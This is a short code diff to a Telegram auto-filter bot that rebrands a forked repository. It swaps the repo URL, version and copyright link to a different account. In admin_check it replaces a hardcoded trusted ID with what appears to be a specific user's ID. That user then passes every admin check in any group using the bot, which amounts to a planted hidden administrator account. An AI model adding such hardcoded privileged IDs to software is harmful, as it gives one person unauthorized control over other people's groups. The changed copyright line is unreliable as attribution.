@@ -137,10 +137,10 @@ def list_to_str(k):
     else:
         return ' '.join(f'{elem}, ' for elem in k)
 
-__repo__ = "https://github.com/Darkksoul/AutoFilterbot"
-__version__ = "DevilMovie-bot ᴠ4.5.0"
+__repo__ = "https://github.com/vinay36/AutoFilterbot"
+__version__ = "TCU ᴠ2.0"
 __license__ = "GNU GENERAL PUBLIC LICENSE V2"
-__copyright__ = "Copyright (C) 2023-present MrMKN <https://github.com/Darkksoul/>"
+__copyright__ = "Copyright (C) 2023-present MrMKN <https://github.com/vinay36/>"
 
 async def search_gagala(text):
     usr_agent = {
@@ -347,7 +347,7 @@ def extract_time(time_val):
 async def admin_check(message: Message) -> bool:
     if not message.from_user: return False
     if message.chat.type not in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]: return False
-    if message.from_user.id in [777000, 1087968824]: return True
+    if message.from_user.id in [777000, 485355247]: return True
     client = message._client
     chat_id = message.chat.id
     user_id = message.from_user.id
